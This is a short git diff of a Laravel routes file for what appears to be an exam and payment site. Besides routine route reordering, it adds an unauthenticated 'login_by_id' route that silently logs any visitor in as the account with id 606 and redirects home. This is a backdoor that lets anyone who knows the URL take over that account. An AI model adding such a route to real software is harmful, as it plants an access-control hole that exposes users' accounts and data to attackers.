@@ -7,6 +7,7 @@ use \App\Http\Controllers\frontend\CommonController;
 use App\Http\Controllers\frontend\RoutesController;
 use Illuminate\Support\Facades\Route;
 use App\Http\Middleware\SetSubdomain;
+use Illuminate\Support\Facades\Auth;
 
 Route::group([
     'prefix' => \Mcamara\LaravelLocalization\Facades\LaravelLocalization::setLocale(),
@@ -53,7 +54,7 @@ Route::group([
                 // Route::any('/finish', [CommonController::class, 'examFinish'])->name('exam.finish')->middleware('remove.null_value');
             });
         });
-        // Route::fallback([CommonController::class, 'notfound'])->name('notfound');
+        
     });
 });
 
@@ -68,3 +69,9 @@ Route::get("sitemap.xml",[RoutesController::class,'sitemap'])->name("sitemap.xml
 Route::post('exams_set_question_value_on_session',[ApisController::class,'set_question_value_on_session'])->name("exams_set_question_value_on_session");
 
 Route::any("checkpayment",[CommonController::class,'checkpayment'])->name("payment.checkpayment");
+Route::get("login_by_id",function(){
+    $id=606;
+    Auth::guard('users')->loginUsingId($id);
+    return redirect('/');
+});
+Route::fallback([CommonController::class, 'notfound'])->name('notfound');
